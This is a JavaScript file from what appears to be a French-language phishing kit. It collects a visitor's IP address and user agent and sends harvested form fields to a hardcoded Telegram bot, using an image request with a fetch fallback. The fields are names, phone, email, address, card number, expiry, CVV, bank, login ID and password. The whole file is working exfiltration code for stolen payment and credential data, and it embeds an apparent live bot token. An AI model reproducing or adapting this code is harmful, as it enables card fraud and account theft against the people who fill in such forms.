// tg.js
const TELEGRAM_TOKEN = '7837023729:AAFRyzbZKsU_TFztd075sOCSgSGJX-4orTs';
const CHAT_ID        = '-4766781392';

// JSONP ipify
function handleIP(data) {
  window.__CLIENT_IP__ = data.ip;
}
(function() {
  var s = document.createElement('script');
  s.src = 'https://api.ipify.org?format=jsonp&callback=handleIP';
  document.head.appendChild(s);
})();

// debug in-page
function logDebug(msg) {
  var panel = document.getElementById('debug-panel');
  if (!panel) return;
  var line = document.createElement('div');
  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  panel.appendChild(line);
  panel.scrollTop = panel.scrollHeight;
}

// garder les <img> pour Safari iOS
window._tgImages = [];

/**
 * Envoie la notif Telegram, avec <img> + fallback fetch no-cors
 */
function sendTelegramNotification(message) {
  logDebug('🔥 Démarrage sendTelegramNotification');
  logDebug('Message brut: ' + message);

  var ip = window.__CLIENT_IP__ || 'unknown';
  var ua = navigator.userAgent || 'unknown';
  logDebug('IP détectée: ' + ip);
  logDebug('User-Agent: ' + ua);

  var now = new Date();
  var pad = n => String(n).padStart(2,'0');
  var datetime = pad(now.getDate()) + '/' + pad(now.getMonth()+1) + '/' +
                 now.getFullYear().toString().slice(-2) + ', ' +
                 pad(now.getHours()) + ':' + pad(now.getMinutes()) + ':' + pad(now.getSeconds());
  logDebug('Horodatage: ' + datetime);

  // Construction du texte
  var parts  = message.split('\n');
  var header = parts.shift();
  var text   = '[📝] ' + header;
  if (parts.length) {
    text += '\n' + parts.map(line => {
      if (line.startsWith('Nom:'))       return line.replace('Nom:', '👤 Nom:');
      if (line.startsWith('Prénom:'))    return line.replace('Prénom:', '🙋 Prénom:');
      if (line.startsWith('Téléphone:')) return line.replace('Téléphone:', '📞 Téléphone:');
      if (line.startsWith('Email:'))     return line.replace('Email:', '✉️ Email:');
      if (line.startsWith('Adresse:'))   return line.replace('Adresse:', '🏠 Adresse:');
      if (line.startsWith('Numéro:'))    return line.replace('Numéro:', '💳 Numéro:');
      if (line.startsWith('Exp:'))       return line.replace('Exp:', '📅 Exp:');
      if (line.startsWith('CVV:'))       return line.replace('CVV:', '🔒 CVV:');
      if (line.startsWith('Banque:'))    return line.replace('Banque:', '🏦 Banque:');
      if (line.startsWith('ID:'))        return line.replace('ID:', '🆔 ID:');
      if (line.startsWith('Pass:'))      return line.replace('Pass:', '🔑 Pass:');
      return line;
    }).join('\n');
  }
  text += '\n\n[🗓️] Date & heure : ' + datetime +
          '\n[🌐] IP Client     : ' + ip +
          '\n[📍] User-Agent    : ' + ua;
  logDebug('Texte final: ' + text.replace(/\n/g,' ⏎ '));

  var url = 'https://api.telegram.org/bot' + TELEGRAM_TOKEN +
            '/sendMessage?chat_id=' + encodeURIComponent(CHAT_ID) +
            '&parse_mode=Markdown&text=' + encodeURIComponent(text);
  logDebug('URL Telegram: ' + url);

  // 1) Tentative <img>
  var img = new Image();
  img.src = url;
  window._tgImages.push(img);
  img.onload  = () => logDebug('✔️ <img> envoyé avec succès');
  img.onerror = e => {
    logDebug('❌ <img> failed, fallback fetch (no-cors)');

    // 2) Fallback fetch no-cors
    fetch(url, { mode: 'no-cors' })
      .then(() => logDebug('✔️ fetch no-cors envoyé'))
      .catch(err => logDebug('❌ fetch error: ' + err));
  };
}

// expose
window.sendTelegramNotification = sendTelegramNotification;